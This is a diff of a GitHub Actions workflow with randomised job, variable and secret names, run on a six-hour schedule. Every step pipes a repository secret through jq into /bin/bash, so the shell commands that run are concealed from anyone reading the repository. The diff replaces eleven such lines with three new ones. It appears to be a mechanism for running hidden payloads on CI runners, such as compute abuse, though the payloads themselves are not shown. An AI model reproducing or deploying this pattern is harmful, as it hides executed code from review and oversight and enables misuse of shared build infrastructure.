@@ -2,25 +2,18 @@ name: dongaoxiong6715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '55 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongaoxiong6715
         env:
-          uen16506: ${{ secrets.uen16506 }}
+          sqze5: ${{ secrets.sqze5 }}
         run: |
-          echo $uen16506 | jq -r .vfdj1655 | /bin/bash
-          echo $cqb728 | jq -r .ljw29 | /bin/bash
-          echo $q73051 | jq -r .rpdic1246 | /bin/bash
-          echo $fweks354 | jq -r .kfrwx59 | /bin/bash
-          echo $kh02331 | jq -r .mkzz5608 | /bin/bash
-          echo $ccjjn35 | jq -r .rkn62697 | /bin/bash
-          echo $qtnh917 | jq -r .xpzd0 | /bin/bash
-          echo $tykbn607 | jq -r .fduzl306 | /bin/bash
-          echo $uzqik25887 | jq -r .v54394 | /bin/bash
-          echo $e47793 | jq -r .hf57427 | /bin/bash
-          echo $hrzl99501 | jq -r .yndm44 | /bin/bash
+          echo $sqze5 | jq -r .o9612 | /bin/bash
+          echo $zcnd887 | jq -r .pb697 | /bin/bash
+          echo $fclbi1406 | jq -r .fithr5013 | /bin/bash
 
